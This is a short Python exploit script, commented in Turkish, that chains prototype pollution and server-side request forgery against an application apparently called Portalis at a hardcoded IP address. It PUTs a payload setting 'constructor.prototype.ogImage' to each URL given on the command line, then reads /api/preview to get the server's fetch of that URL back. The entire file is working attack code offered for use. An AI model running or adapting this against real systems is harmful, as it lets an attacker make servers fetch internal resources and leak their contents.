#!/usr/bin/env python3
"""Portalis SSRF aracı: prototype pollution ile ogImage set edip /api/preview'dan okur."""
import json
import sys
import urllib.request

BASE = "http://91.107.189.166:3000"


def new_session():
    cj = urllib.request.HTTPCookieProcessor()
    op = urllib.request.build_opener(cj)
    op.open(BASE + "/", timeout=20).read()
    return op


def fetch(op, url, timeout=25):
    body = json.dumps({"constructor": {"prototype": {"ogImage": url}}}).encode()
    req = urllib.request.Request(
        BASE + "/api/theme", data=body, method="PUT",
        headers={"Content-Type": "application/json"},
    )
    op.open(req, timeout=timeout).read()
    return op.open(BASE + "/api/preview", timeout=timeout).read().decode("utf-8", "replace")


if __name__ == "__main__":
    op = new_session()
    for url in sys.argv[1:]:
        try:
            out = fetch(op, url)
        except Exception as exc:  # noqa: BLE001
            out = f"<hata: {exc}>"
        print(f"### {url}\n{out}\n")
